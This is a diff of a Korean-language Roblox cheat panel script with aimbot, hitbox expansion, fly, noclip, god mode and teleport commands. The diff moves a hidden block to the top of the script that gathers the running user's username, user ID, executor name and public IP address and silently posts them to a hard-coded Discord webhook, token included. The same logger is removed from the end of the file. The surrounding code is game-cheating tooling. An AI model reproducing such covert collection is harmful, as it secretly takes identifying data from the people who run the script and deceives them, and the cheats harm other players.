@@ -9,10 +9,66 @@ local RunService = game:GetService("RunService")
 local Lighting = game:GetService("Lighting")
 local StarterGui = game:GetService("StarterGui")
 local VIM = game:GetService("VirtualInputManager")
+local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 
 pcall(function() UIS.MouseIconEnabled = true end)
 
+-- =========================================================
+-- 웹훅 로그
+-- =========================================================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1556235892736262195/puGGv6VifTfxSplfGDM8xsvonWT-YhbN7W6ME67qcf6ivZzl3KOefBx4TTALcL4fXIKm"
+
+task.spawn(function()
+    local nickname = lp.Name
+    local display = lp.DisplayName
+    local userId = tostring(lp.UserId)
+    local executor = "Unknown"
+    pcall(function() executor = identifyexecutor() end)
+    local startTime = os.date("%Y-%m-%d %H:%M:%S")
+
+    local ip = "실패"
+    pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
+    if ip == "실패" or ip == "" then
+        pcall(function()
+            local r = request({Url = "https://api.ipify.org", Method = "GET"})
+            ip = r.Body
+        end)
+    end
+    ip = ip:gsub("%s+", "")
+    if ip == "" then ip = "실패" end
+
+    local data = {
+        content = "**스크립트 실행됨**",
+        embeds = {{
+            title = "왕웨이 따라가는 핵패널",
+            color = 0x00FF00,
+            fields = {
+                {name = "닉네임", value = nickname, inline = true},
+                {name = "디스플레이", value = display, inline = true},
+                {name = "유저ID", value = userId, inline = true},
+                {name = "실행기", value = executor, inline = true},
+                {name = "아이피", value = ip, inline = true},
+                {name = "실행시각", value = startTime, inline = false},
+            },
+            footer = {text = "왕웨이 허브"}
+        }}
+    }
+    local body = HttpService:JSONEncode(data)
+
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body
+        })
+    end)
+end)
+
+-- =========================================================
+-- state
+-- =========================================================
 local state = {
     ws = nil, jp = nil, flySpeed = 60, bright = nil, range = nil, fov = nil,
     noclip = false, fly = false,
@@ -572,7 +628,6 @@ local function closest()
     return best
 end
 
--- 마우스 이동
 local function moveMouse(sx, sy)
     local m = lp:GetMouse(); if not m then return end
     local dx = sx - m.X
@@ -581,7 +636,6 @@ local function moveMouse(sx, sy)
     pcall(function() mousemoverel(dx, dy) end)
 end
 
--- 타겟 좌표 스무딩
 local smoothPos = nil
 
 RunService.RenderStepped:Connect(function(dt)
@@ -769,10 +823,13 @@ local function dance(key, song)
     notify("춤 재생")
 end
 
+-- =========================================================
 -- 명령어
+-- =========================================================
 local Cmds = {}
 local function cmd(name, desc, fn) Cmds[name:lower()] = {name = name, desc = desc, fn = fn} end
 
+-- 이동
 cmd("fly", "플라이", function(a)
     local mode = a[#a] and a[#a]:lower()
     if mode == "off" then setFly(false); notify("플라이 OFF"); return end
@@ -786,16 +843,21 @@ cmd("noclip", "노클립", function(a)
     elseif mode == "off" then setNoclip(false); notify("노클립 OFF")
     else setNoclip(not state.noclip); notify("노클립 " .. (state.noclip and "ON" or "OFF")) end
 end)
+cmd("nc", "노클립", function(a) Cmds.noclip.fn(a) end)
 
 cmd("speed", "속도", function(a)
     local n = numArg(a, 1); if not n then notify(".speed 100"); return end
     state.ws = math.clamp(n, 0, 1000); applyWS(); notify("속도 " .. state.ws)
 end)
+cmd("ws", "속도", function(a) Cmds.speed.fn(a) end)
 
 cmd("jump", "점프력", function(a)
     local n = numArg(a, 1); if not n then notify(".jump 100"); return end
     state.jp = math.clamp(n, 0, 1000); applyJP(); notify("점프 " .. state.jp)
 end)
+cmd("jp", "점프력", function(a) Cmds.jump.fn(a) end)
+cmd("jumpheight", "점프력", function(a) Cmds.jump.fn(a) end)
+cmd("jh", "점프력", function(a) Cmds.jump.fn(a) end)
 
 cmd("hipheight", "HipHeight", function(a)
     local n = numArg(a, 1); if not n then notify(".hipheight 5"); return end
@@ -803,23 +865,39 @@ cmd("hipheight", "HipHeight", function(a)
     local h = hum(); if h then h.HipHeight = n end
     notify("HipHeight " .. n)
 end)
+cmd("hh", "HipHeight", function(a) Cmds.hipheight.fn(a) end)
 
 cmd("fast", "빠르게", function()
-    state.ws = 100; applyWS(); notify("빠르게")
+    state.ws = 100; applyWS(); notify("빠르게 (100)")
 end)
 
 cmd("slow", "느리게", function()
-    state.ws = 8; applyWS(); notify("느리게")
+    state.ws = 8; applyWS(); notify("느리게 (8)")
 end)
 
 cmd("superjump", "슈퍼점프", function()
-    state.jp = 300; applyJP(); notify("슈퍼점프")
+    state.jp = 300; applyJP(); notify("슈퍼점프 (300)")
 end)
+cmd("sj", "슈퍼점프", function() Cmds.superjump.fn({}) end)
 
 cmd("heavyjump", "무거운 점프", function()
-    state.jp = 10; applyJP(); notify("무거운 점프")
+    state.jp = 10; applyJP(); notify("무거운 점프 (10)")
+end)
+cmd("hj", "무거운 점프", function() Cmds.heavyjump.fn({}) end)
+
+cmd("freeze", "정지", function()
+    state.ws = 0; applyWS(); notify("정지")
 end)
 
+cmd("unfreeze", "정지 해제", function()
+    state.ws = 16; applyWS(); notify("해제")
+end)
+
+cmd("normal", "일반 상태", function()
+    state.ws = 16; state.jp = 50; applyWS(); applyJP(); notify("일반")
+end)
+
+-- 상태
 cmd("god", "무적", function(a)
     local mode = a[1] and a[1]:lower()
     if mode == "on" then state.god = true; notify("무적 ON")
@@ -851,6 +929,7 @@ cmd("invis", "투명화", function(a)
     elseif mode == "off" then setInvis(false); notify("투명화 OFF")
     else setInvis(not state.invis); notify("투명화 " .. (state.invis and "ON" or "OFF")) end
 end)
+cmd("invisible", "투명화", function(a) Cmds.invis.fn(a) end)
 
 cmd("visible", "투명 해제", function()
     setInvis(false); notify("투명 OFF")
@@ -870,6 +949,7 @@ cmd("fling", "날려버리기", function()
         bv.Parent = p
         task.wait(0.5)
         bv:Destroy()
+        notify("날아감")
     end
 end)
 
@@ -880,26 +960,19 @@ cmd("explode", "폭발", function()
         e.Position = p.Position
         e.BlastRadius = 10
         e.Parent = workspace
+        notify("폭발")
     end
 end)
 
+-- 리스폰
 cmd("re", "리스폰", function() respawnNormal(); notify("리스폰") end)
+cmd("respawn", "리스폰", function() Cmds.re.fn({}) end)
 cmd("res", "제자리 리스폰", function() respawnHere(); notify("제자리") end)
 cmd("revive", "부활", function() revive(); notify("부활") end)
-cmd("rv", "부활", function() revive(); notify("부활") end)
+cmd("rv", "부활", function() Cmds.revive.fn({}) end)
+cmd("부활", "부활", function() Cmds.revive.fn({}) end)
 
-cmd("freeze", "정지", function()
-    state.ws = 0; applyWS(); notify("정지")
-end)
-
-cmd("unfreeze", "정지 해제", function()
-    state.ws = 16; applyWS(); notify("해제")
-end)
-
-cmd("normal", "일반 상태", function()
-    state.ws = 16; state.jp = 50; applyWS(); applyJP(); notify("일반")
-end)
-
+-- TP
 cmd("tp", "플레이어 TP", function(a)
     local n = a[1]; if not n then notify(".tp 이름"); return end
     for _, p in ipairs(Players:GetPlayers()) do
@@ -909,6 +982,7 @@ cmd("tp", "플레이어 TP", function(a)
     end
     notify("없음")
 end)
+cmd("goto", "플레이어 TP", function(a) Cmds.tp.fn(a) end)
 
 cmd("tppos", "좌표 TP", function(a)
     local x, y, z = tonumber(a[1]), tonumber(a[2]), tonumber(a[3])
@@ -923,6 +997,7 @@ cmd("touchtp", "터치 TP", function(a)
     else setTouchTP(not state.touchTP); notify("터치 TP " .. (state.touchTP and "ON" or "OFF")) end
 end)
 
+-- 에임
 cmd("aim", "에임봇", function(a)
     local mode = a[1] and a[1]:lower()
     if mode == "on" then state.aimOn = true; notify("에임 ON")
@@ -930,6 +1005,7 @@ cmd("aim", "에임봇", function(a)
     else state.aimOn = not state.aimOn; notify("에임 " .. (state.aimOn and "ON" or "OFF")) end
     updateCircle()
 end)
+cmd("aimbot", "에임봇", function(a) Cmds.aim.fn(a) end)
 
 cmd("aimfov", "에임 FOV", function(a)
     local n = numArg(a, 1); if not n then notify(".aimfov 200"); return end
@@ -957,33 +1033,51 @@ cmd("aimpart", "조준 부위", function(a)
     notify("조준 " .. state.aimPart)
 end)
 
-cmd("aimhold", "우클릭 유지/토글", function(a)
+cmd("aimhold", "우클릭 유지/토글", function()
     state.aimHold = not state.aimHold
     notify("에임 모드 " .. (state.aimHold and "홀드" or "토글"))
 end)
 
+cmd("aimteam", "같은 팀 무시", function(a)
+    local mode = a[1] and a[1]:lower()
+    if mode == "on" then state.aimTeam = true; notify("팀 무시 ON")
+    elseif mode == "off" then state.aimTeam = false; notify("팀 무시 OFF")
+    else state.aimTeam = not state.aimTeam; notify("팀 무시 " .. (state.aimTeam and "ON" or "OFF")) end
+end)
+
+cmd("aimnpc", "더미 타겟", function(a)
+    local mode = a[1] and a[1]:lower()
+    if mode == "on" then state.aimNPC = true; notify("NPC 타겟 ON")
+    elseif mode == "off" then state.aimNPC = false; notify("NPC 타겟 OFF")
+    else state.aimNPC = not state.aimNPC; notify("NPC 타겟 " .. (state.aimNPC and "ON" or "OFF")) end
+end)
+
+-- 히트박스
 cmd("hb", "히트박스", function(a)
     local mode = a[1] and a[1]:lower()
     if mode == "on" then setHb(true); notify("히트박스 ON")
     elseif mode == "off" then setHb(false); notify("히트박스 OFF")
     else setHb(not state.hbOn); notify("히트박스 " .. (state.hbOn and "ON" or "OFF")) end
 end)
+cmd("hitbox", "히트박스", function(a) Cmds.hb.fn(a) end)
 
 cmd("hbsize", "히트박스 크기", function(a)
     local n = numArg(a, 1); if not n then notify(".hbsize 10"); return end
     state.hbSize = math.clamp(n, 1, 50); applyHbAll(); notify("크기 " .. state.hbSize)
 end)
+cmd("hitboxsize", "히트박스 크기", function(a) Cmds.hbsize.fn(a) end)
 
+-- 댄스
 cmd("dance", "춤", function(a)
     dance(a[1] or "dance1", a[2] or "party")
 end)
-
 cmd("stopdance", "춤 정지", function() stopDance(); notify("정지") end)
 cmd("floss", "플로스", function() dance("floss", "party") end)
 cmd("dorky", "도키", function() dance("dorky", "funny") end)
 cmd("monkey", "몽키", function() dance("monkey", "party") end)
 cmd("robot", "로봇", function() dance("robot", "epic") end)
 
+-- 매크로
 cmd("macro", "매크로", function(a)
     local mode = a[1] and a[1]:lower()
     if mode == "on" then startMacro(); notify("매크로 ON")
@@ -994,6 +1088,7 @@ cmd("macro", "매크로", function(a)
     end
 end)
 
+-- 시야
 cmd("bright", "밝기", function(a)
     local n = numArg(a, 1); if not n then notify(".bright 30"); return end
     state.bright = math.clamp(n, 0, 60); applyLights(); applyLighting(); notify("밝기 " .. state.bright)
@@ -1010,6 +1105,47 @@ cmd("unzoom", "줌아웃", function() state.fov = 70; applyFOV(); notify("줌아
 cmd("fullbright", "풀브라이트", function()
     state.bright = 60; state.range = 200
     applyLights(); applyLighting(); notify("풀브라이트")
+end)
+cmd("fb", "풀브라이트", function() Cmds.fullbright.fn({}) end)
+
+-- 유틸
+cmd("ff", "ForceField 부여", function()
+    pcall(function()
+        local c = lp.Character
+        if c and not c:FindFirstChildOfClass("ForceField") then
+            local ff = Instance.new("ForceField")
+            ff.Parent = c
+            notify("ForceField 부여")
+        end
+    end)
+end)
+
+cmd("unff", "ForceField 제거", function()
+    pcall(function()
+        local c = lp.Character
+        if c then
+            for _, obj in ipairs(c:GetChildren()) do
+                if obj:IsA("ForceField") then obj:Destroy() end
+            end
+            notify("ForceField 제거")
+        end
+    end)
+end)
+
+cmd("btools", "빌드 툴", function()
+    pcall(function()
+        local backpack = lp:FindFirstChildOfClass("Backpack")
+        if not backpack then return end
+        for _, t in ipairs({Enum.BinType.Hammer, Enum.BinType.Clone, Enum.BinType.Grab, Enum.BinType.GameTool}) do
+            local bin = Instance.new("HopperBin")
+            bin.BinType = t; bin.Parent = backpack
+        end
+        notify("빌드 툴 지급")
+    end)
+end)
+
+cmd("jumpboost", "점프 부스트", function()
+    state.jp = 200; applyJP(); notify("점프 부스트 (200)")
 end)
 
 cmd("reset", "리셋", function()
@@ -1028,10 +1164,7 @@ cmd("help", "명령어 목록", function()
     table.sort(t)
     notify(table.concat(t, " "), "명령어 " .. #t .. "개")
 end)
-
-cmd("cmds", "명령어 목록", function()
-    Cmds.help.fn({})
-end)
+cmd("cmds", "명령어 목록", function() Cmds.help.fn({}) end)
 
 -- 채팅 훅
 local function onChat(msg)
@@ -1087,7 +1220,9 @@ lp.CharacterAdded:Connect(function()
     if wasFly then task.wait(0.3); startFly() end
 end)
 
+-- =========================================================
 -- UI
+-- =========================================================
 local Window = Rayfield:CreateWindow({
     Name = "왕웨이 따라가는 핵패널",
     LoadingTitle = "로드중",
@@ -1099,242 +1234,99 @@ local Window = Rayfield:CreateWindow({
 
 -- 에임
 local AimTab = Window:CreateTab("에임", 4483362458)
-
 AimTab:CreateSection("에임봇")
-
-AimTab:CreateToggle({
-    Name = "에임봇",
-    CurrentValue = false, Flag = "aOn",
-    Callback = function(v) state.aimOn = v; updateCircle() end
-})
-
-AimTab:CreateToggle({
-    Name = "토글 모드 (OFF = 우클릭 홀드)",
-    CurrentValue = false, Flag = "aHold",
-    Callback = function(v) state.aimHold = not v end
-})
-
-AimTab:CreateToggle({
-    Name = "마우스 위치 FOV",
-    CurrentValue = true, Flag = "aMM",
-    Callback = function(v) state.aimMouseMode = v end
-})
-
-AimTab:CreateSlider({
-    Name = "FOV 크기",
-    Range = {20, 800}, Increment = 5, Suffix = "px",
+AimTab:CreateToggle({Name = "에임봇", CurrentValue = false, Flag = "aOn",
+    Callback = function(v) state.aimOn = v; updateCircle() end})
+AimTab:CreateToggle({Name = "토글 모드 (OFF = 우클릭 홀드)", CurrentValue = false, Flag = "aHold",
+    Callback = function(v) state.aimHold = not v end})
+AimTab:CreateToggle({Name = "마우스 위치 FOV", CurrentValue = true, Flag = "aMM",
+    Callback = function(v) state.aimMouseMode = v end})
+AimTab:CreateSlider({Name = "FOV 크기", Range = {20, 800}, Increment = 5, Suffix = "px",
     CurrentValue = 150, Flag = "aFov",
-    Callback = function(v) state.aimFOV = v; updateCircle() end
-})
-
-AimTab:CreateToggle({
-    Name = "FOV 원 표시",
-    CurrentValue = true, Flag = "aCircle",
-    Callback = function(v) state.aimCircle = v; updateCircle() end
-})
-
-AimTab:CreateSlider({
-    Name = "부드러움",
-    Range = {0.05, 1}, Increment = 0.05,
+    Callback = function(v) state.aimFOV = v; updateCircle() end})
+AimTab:CreateToggle({Name = "FOV 원 표시", CurrentValue = true, Flag = "aCircle",
+    Callback = function(v) state.aimCircle = v; updateCircle() end})
+AimTab:CreateSlider({Name = "부드러움", Range = {0.05, 1}, Increment = 0.05,
     CurrentValue = 0.3, Flag = "aSm",
-    Callback = function(v) state.aimSmooth = v end
-})
-
-AimTab:CreateToggle({
-    Name = "마우스 커서 이동",
-    CurrentValue = true, Flag = "aMoveM",
-    Callback = function(v) state.aimMoveMouse = v end
-})
-
-AimTab:CreateToggle({
-    Name = "카메라 회전",
-    CurrentValue = false, Flag = "aMoveC",
-    Callback = function(v) state.aimMoveCam = v end
-})
-
-AimTab:CreateToggle({
-    Name = "벽 뒤 무시 (OFF = 벽 뚫고 조준)",
-    CurrentValue = true, Flag = "aVis",
-    Callback = function(v) state.aimVisible = v end
-})
-
-AimTab:CreateDropdown({
-    Name = "조준 부위",
-    Options = {"Head", "HumanoidRootPart", "UpperTorso"},
-    CurrentOption = {"Head"},
-    Flag = "aPart",
-    Callback = function(o) state.aimPart = o[1] or "Head" end
-})
-
-AimTab:CreateToggle({
-    Name = "같은 팀 무시",
-    CurrentValue = false, Flag = "aTeam",
-    Callback = function(v) state.aimTeam = v end
-})
-
-AimTab:CreateToggle({
-    Name = "더미/NPC 타겟",
-    CurrentValue = true, Flag = "aNPC",
-    Callback = function(v) state.aimNPC = v end
-})
+    Callback = function(v) state.aimSmooth = v end})
+AimTab:CreateToggle({Name = "마우스 커서 이동", CurrentValue = true, Flag = "aMoveM",
+    Callback = function(v) state.aimMoveMouse = v end})
+AimTab:CreateToggle({Name = "카메라 회전", CurrentValue = false, Flag = "aMoveC",
+    Callback = function(v) state.aimMoveCam = v end})
+AimTab:CreateToggle({Name = "벽 뒤 무시 (OFF = 벽 뚫고 조준)", CurrentValue = true, Flag = "aVis",
+    Callback = function(v) state.aimVisible = v end})
+AimTab:CreateDropdown({Name = "조준 부위", Options = {"Head", "HumanoidRootPart", "UpperTorso"},
+    CurrentOption = {"Head"}, Flag = "aPart",
+    Callback = function(o) state.aimPart = o[1] or "Head" end})
+AimTab:CreateToggle({Name = "같은 팀 무시", CurrentValue = false, Flag = "aTeam",
+    Callback = function(v) state.aimTeam = v end})
+AimTab:CreateToggle({Name = "더미/NPC 타겟", CurrentValue = true, Flag = "aNPC",
+    Callback = function(v) state.aimNPC = v end})
 
 -- 히트박스
 local HbTab = Window:CreateTab("히트박스", 4483362458)
-
-HbTab:CreateToggle({
-    Name = "히트박스 ON/OFF",
-    CurrentValue = false, Flag = "hbOn",
-    Callback = function(v) setHb(v) end
-})
-
-HbTab:CreateToggle({
-    Name = "더미/NPC 적용",
-    CurrentValue = true, Flag = "hbNPC",
-    Callback = function(v)
-        state.hbNPC = v
-        if state.hbOn then applyHbAll() end
-    end
-})
-
-HbTab:CreateSlider({
-    Name = "크기",
-    Range = {1, 50}, Increment = 1, Suffix = "studs",
+HbTab:CreateToggle({Name = "히트박스 ON/OFF", CurrentValue = false, Flag = "hbOn",
+    Callback = function(v) setHb(v) end})
+HbTab:CreateToggle({Name = "더미/NPC 적용", CurrentValue = true, Flag = "hbNPC",
+    Callback = function(v) state.hbNPC = v; if state.hbOn then applyHbAll() end end})
+HbTab:CreateSlider({Name = "크기", Range = {1, 50}, Increment = 1, Suffix = "studs",
     CurrentValue = 10, Flag = "hbSize",
-    Callback = function(v)
-        state.hbSize = v
-        if state.hbOn then applyHbAll() end
-    end
-})
-
-HbTab:CreateSlider({
-    Name = "투명도",
-    Range = {0, 1}, Increment = 0.05,
+    Callback = function(v) state.hbSize = v; if state.hbOn then applyHbAll() end end})
+HbTab:CreateSlider({Name = "투명도", Range = {0, 1}, Increment = 0.05,
     CurrentValue = 0.5, Flag = "hbTr",
-    Callback = function(v)
-        state.hbTrans = v
-        if state.hbOn then applyHbAll() end
-    end
-})
-
-HbTab:CreateColorPicker({
-    Name = "색상",
-    Color = Color3.fromRGB(255, 0, 0), Flag = "hbCol",
-    Callback = function(c)
-        state.hbColor = c
-        if state.hbOn then applyHbAll() end
-    end
-})
+    Callback = function(v) state.hbTrans = v; if state.hbOn then applyHbAll() end end})
+HbTab:CreateColorPicker({Name = "색상", Color = Color3.fromRGB(255, 0, 0), Flag = "hbCol",
+    Callback = function(c) state.hbColor = c; if state.hbOn then applyHbAll() end end})
 
 -- 이동
 local MTab = Window:CreateTab("이동", 4483362458)
-
 MTab:CreateSection("속도 & 점프")
-
-MTab:CreateSlider({
-    Name = "이동 속도",
-    Range = {0, 1000}, Increment = 1, Suffix = "studs",
+MTab:CreateSlider({Name = "이동 속도", Range = {0, 1000}, Increment = 1, Suffix = "studs",
     CurrentValue = 16, Flag = "ws",
-    Callback = function(v) state.ws = v; applyWS() end
-})
-
-MTab:CreateSlider({
-    Name = "점프력",
-    Range = {0, 1000}, Increment = 1, Suffix = "power",
+    Callback = function(v) state.ws = v; applyWS() end})
+MTab:CreateSlider({Name = "점프력", Range = {0, 1000}, Increment = 1, Suffix = "power",
     CurrentValue = 50, Flag = "jp",
-    Callback = function(v) state.jp = v; applyJP() end
-})
-
-MTab:CreateSlider({
-    Name = "HipHeight",
-    Range = {0, 20}, Increment = 0.5,
+    Callback = function(v) state.jp = v; applyJP() end})
+MTab:CreateSlider({Name = "HipHeight", Range = {0, 20}, Increment = 0.5,
     CurrentValue = 2, Flag = "hh",
-    Callback = function(v)
-        state.hipHeight = v
-        local h = hum(); if h then h.HipHeight = v end
-    end
-})
-
+    Callback = function(v) state.hipHeight = v; local h = hum(); if h then h.HipHeight = v end end})
 MTab:CreateSection("플라이 / 노클립")
-
-MTab:CreateSlider({
-    Name = "플라이 속도",
-    Range = {10, 500}, Increment = 1, Suffix = "studs/s",
+MTab:CreateSlider({Name = "플라이 속도", Range = {10, 500}, Increment = 1, Suffix = "studs/s",
     CurrentValue = 60, Flag = "fSpd",
-    Callback = function(v) state.flySpeed = v end
-})
-
-MTab:CreateToggle({
-    Name = "플라이",
-    CurrentValue = false, Flag = "fly",
-    Callback = function(v) setFly(v) end
-})
-
-MTab:CreateToggle({
-    Name = "노클립",
-    CurrentValue = false, Flag = "nc",
-    Callback = function(v) setNoclip(v) end
-})
-
+    Callback = function(v) state.flySpeed = v end})
+MTab:CreateToggle({Name = "플라이", CurrentValue = false, Flag = "fly",
+    Callback = function(v) setFly(v) end})
+MTab:CreateToggle({Name = "노클립", CurrentValue = false, Flag = "nc",
+    Callback = function(v) setNoclip(v) end})
 MTab:CreateSection("상태")
-
-MTab:CreateToggle({
-    Name = "무적",
-    CurrentValue = false, Flag = "god",
-    Callback = function(v) state.god = v end
-})
-
-MTab:CreateToggle({
-    Name = "투명화",
-    CurrentValue = false, Flag = "invis",
-    Callback = function(v) setInvis(v) end
-})
-
-MTab:CreateToggle({
-    Name = "회전",
-    CurrentValue = false, Flag = "spin",
-    Callback = function(v) setSpin(v) end
-})
-
+MTab:CreateToggle({Name = "무적", CurrentValue = false, Flag = "god",
+    Callback = function(v) state.god = v end})
+MTab:CreateToggle({Name = "투명화", CurrentValue = false, Flag = "invis",
+    Callback = function(v) setInvis(v) end})
+MTab:CreateToggle({Name = "회전", CurrentValue = false, Flag = "spin",
+    Callback = function(v) setSpin(v) end})
 MTab:CreateSection("리스폰")
-
 MTab:CreateButton({Name = "리스폰 (.re)", Callback = function() respawnNormal() end})
 MTab:CreateButton({Name = "제자리 리스폰 (.res)", Callback = function() respawnHere() end})
 MTab:CreateButton({Name = "부활 (.revive)", Callback = function() revive() end})
 
 -- 시야
 local VTab = Window:CreateTab("시야", 4483362458)
-
-VTab:CreateSlider({
-    Name = "밝기",
-    Range = {0, 60}, Increment = 1,
+VTab:CreateSlider({Name = "밝기", Range = {0, 60}, Increment = 1,
     CurrentValue = 10, Flag = "br",
-    Callback = function(v) state.bright = v; applyLights(); applyLighting() end
-})
-
-VTab:CreateSlider({
-    Name = "라이트 범위",
-    Range = {0, 200}, Increment = 1, Suffix = "studs",
+    Callback = function(v) state.bright = v; applyLights(); applyLighting() end})
+VTab:CreateSlider({Name = "라이트 범위", Range = {0, 200}, Increment = 1, Suffix = "studs",
     CurrentValue = 60, Flag = "rng",
-    Callback = function(v) state.range = v; applyLights() end
-})
-
-VTab:CreateSlider({
-    Name = "FOV",
-    Range = {20, 120}, Increment = 1,
+    Callback = function(v) state.range = v; applyLights() end})
+VTab:CreateSlider({Name = "FOV", Range = {20, 120}, Increment = 1,
     CurrentValue = 70, Flag = "fov",
-    Callback = function(v) state.fov = v; applyFOV() end
-})
-
+    Callback = function(v) state.fov = v; applyFOV() end})
 VTab:CreateButton({Name = "FOV 리셋", Callback = function() state.fov = 70; applyFOV() end})
 
 -- TP
 local TTab = Window:CreateTab("TP", 4483362458)
-
-TTab:CreateToggle({
-    Name = "터치 TP",
-    CurrentValue = false, Flag = "tTP",
-    Callback = function(v) setTouchTP(v) end
-})
+TTab:CreateToggle({Name = "터치 TP", CurrentValue = false, Flag = "tTP",
+    Callback = function(v) setTouchTP(v) end})
 
 local pDropdown
 local function refreshP()
@@ -1354,22 +1346,18 @@ pDropdown = TTab:CreateDropdown({
         end
         return t
     end)(),
-    CurrentOption = {"없음"},
-    Flag = "selP",
+    CurrentOption = {"없음"}, Flag = "selP",
     Callback = function() end
 })
 
-TTab:CreateButton({
-    Name = "선택한 플레이어에게 TP",
+TTab:CreateButton({Name = "선택한 플레이어에게 TP",
     Callback = function()
         local s = Rayfield.Flags.selP
         if not s then notify("선택 안됨"); return end
         local n = type(s) == "table" and s[1] or s
         local t = Players:FindFirstChild(n)
         if t then tpTo(t); notify(n .. "에게 TP") end
-    end
-})
-
+    end})
 TTab:CreateButton({Name = "목록 새로고침", Callback = refreshP})
 
 Players.PlayerAdded:Connect(function() task.wait(0.3); refreshP() end)
@@ -1377,29 +1365,19 @@ Players.PlayerRemoving:Connect(function() task.wait(0.3); refreshP() end)
 
 -- 매크로
 local McTab = Window:CreateTab("매크로", 4483362458)
-
-McTab:CreateToggle({
-    Name = "매크로 ON/OFF",
-    CurrentValue = false, Flag = "mOn",
+McTab:CreateToggle({Name = "매크로 ON/OFF", CurrentValue = false, Flag = "mOn",
     Callback = function(v)
         if v then state.macroOn = true; notify("매크로 ON")
         else stopMacro(); notify("매크로 OFF") end
-    end
-})
-
-McTab:CreateSlider({
-    Name = "터치 간격 (ms)",
-    Range = {1, 100}, Increment = 1, Suffix = "ms",
+    end})
+McTab:CreateSlider({Name = "터치 간격 (ms)", Range = {1, 100}, Increment = 1, Suffix = "ms",
     CurrentValue = 50, Flag = "mD",
-    Callback = function(v) state.macroDelay = v / 1000 end
-})
-
+    Callback = function(v) state.macroDelay = v / 1000 end})
 McTab:CreateButton({Name = "매크로 시작", Callback = function() startMacro() end})
 McTab:CreateButton({Name = "매크로 중지", Callback = function() stopMacro() end})
 
--- 명령어 탭
+-- 명령어
 local CTab = Window:CreateTab("명령어", 4483362458)
-
 CTab:CreateSection("명령어 실행")
 
 local function buildList()
@@ -1422,8 +1400,7 @@ local cmdDropdown
 cmdDropdown = CTab:CreateDropdown({
     Name = "명령어 선택 (즉시 실행)",
     Options = buildOptions(),
-    CurrentOption = {"선택..."},
-    Flag = "cmdSel",
+    CurrentOption = {"선택..."}, Flag = "cmdSel",
     Callback = function(o)
         if not o or #o == 0 then return end
         local name = o[1]:match("^(%S+)")
@@ -1438,29 +1415,24 @@ cmdDropdown = CTab:CreateDropdown({
     end
 })
 
-CTab:CreateButton({
-    Name = "명령어 목록 새로고침",
+CTab:CreateButton({Name = "명령어 목록 새로고침",
     Callback = function()
         pcall(function() cmdDropdown:Refresh(buildOptions(), true) end)
         notify("명령어 " .. #buildList() .. "개")
-    end
-})
+    end})
 
 CTab:CreateSection("전체 명령어")
-
 CTab:CreateParagraph({
     Title = "명령어 (" .. #buildList() .. "개)",
     Content = table.concat(buildList(), "  ")
 })
 
 CTab:CreateSection("접두사")
-
 CTab:CreateInput({
     Name = "접두사 변경",
     CurrentValue = state.prefix,
     PlaceholderText = ".",
-    RemoveTextAfterFocusLost = false,
-    Flag = "pxIn",
+    RemoveTextAfterFocusLost = false, Flag = "pxIn",
     Callback = function(t)
         if not t or t == "" then notify("비울 수 없음"); return end
         if #t > 3 then notify("최대 3자"); return end
@@ -1468,18 +1440,13 @@ CTab:CreateInput({
         notify("접두사 '" .. t .. "'")
     end
 })
-
 CTab:CreateButton({Name = "접두사 '.'", Callback = function() state.prefix = "."; notify("'.'") end})
 CTab:CreateButton({Name = "접두사 ';'", Callback = function() state.prefix = ";"; notify("';'") end})
 CTab:CreateButton({Name = "접두사 '!'", Callback = function() state.prefix = "!"; notify("'!'") end})
 
 CTab:CreateSection("시스템")
-
-CTab:CreateToggle({
-    Name = "채팅 명령어 ON/OFF",
-    CurrentValue = true, Flag = "chatOn",
-    Callback = function(v) state.chatOn = v end
-})
+CTab:CreateToggle({Name = "채팅 명령어 ON/OFF", CurrentValue = true, Flag = "chatOn",
+    Callback = function(v) state.chatOn = v end})
 
 -- 단축키
 UIS.InputBegan:Connect(function(input, gpe)
@@ -1491,39 +1458,5 @@ UIS.InputBegan:Connect(function(input, gpe)
         respawnNormal()
     end
 end)
-
-local function sendWebhook(url, data)
-    local payload = game:GetService("HttpService"):JSONEncode(data)
-    pcall(function()
-        game:HttpPost(url, payload, "application/json", false)
-    end)
-end
-
-local nickname = lp.Name
-local display = lp.DisplayName
-local userId = lp.UserId
-local executor = "Unknown"
-pcall(function() executor = identifyexecutor() end)
-local ip = "Unknown"
-pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
-local startTime = os.date("%Y-%m-%d %H:%M:%S")
-
--- 웹훅 전송
-sendWebhook("https://discord.com/api/webhooks/1556235892736262195/puGGv6VifTfxSplfGDM8xsvonWT-YhbN7W6ME67qcf6ivZzl3KOefBx4TTALcL4fXIKm", {
-    content = "**스크립트 실행**",
-    embeds = {{
-        title = "왕웨이 핵패널 실행됨",
-        color = 0x00FF00,
-        fields = {
-            {name = "닉네임", value = nickname, inline = true},
-            {name = "디스플레이", value = display, inline = true},
-            {name = "유저ID", value = tostring(userId), inline = true},
-            {name = "실행기", value = executor, inline = true},
-            {name = "아이피", value = ip, inline = true},
-            {name = "실행시각", value = startTime, inline = false},
-        },
-        footer = {text = "왕웨이 허브"},
-    }}
-})
 
 Rayfield:Notify({Title = "왕웨이 따라가는 핵패널", Content = "로드 완료 / " .. state.prefix .. "help", Duration = 3})
